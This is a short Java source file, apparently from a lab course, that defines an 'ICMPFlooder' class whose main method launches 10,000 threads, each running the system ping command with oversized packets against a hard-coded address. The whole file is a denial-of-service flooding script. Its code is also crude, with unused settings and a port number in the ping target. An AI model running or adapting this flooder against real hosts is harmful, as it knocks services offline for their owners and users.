package FOIS_LAB;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.io.IOException;

public class ICMPFlooder extends Thread{
    private final String IPAddress;

    public static int hopSize = 64;
    public static int timeOut = 250;
    public static long byteSize = 64000;
    public static int THREAD_COUNT = 100;

    public ICMPFlooder(String IP) {
        this.IPAddress = IP;
    }
    public void run() {
            try {
                Process p;
                String s;
                p = Runtime.getRuntime().exec("ping " + IPAddress + " -l " + byteSize);
                BufferedReader br = new BufferedReader(
                        new InputStreamReader(p.getInputStream()));
                while ((s = br.readLine()) != null)
                    System.out.println("line: " + s);
                p.waitFor();
                System.out.println ("exit: " + p.exitValue());
                p.destroy();
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }
        }

    public static void main(String[] args) {
        for (int i = 0; i < 10000; i++) {
            ICMPFlooder icmp = new ICMPFlooder("127.0.0.1:5000");
            icmp.start();

        }

    }

}
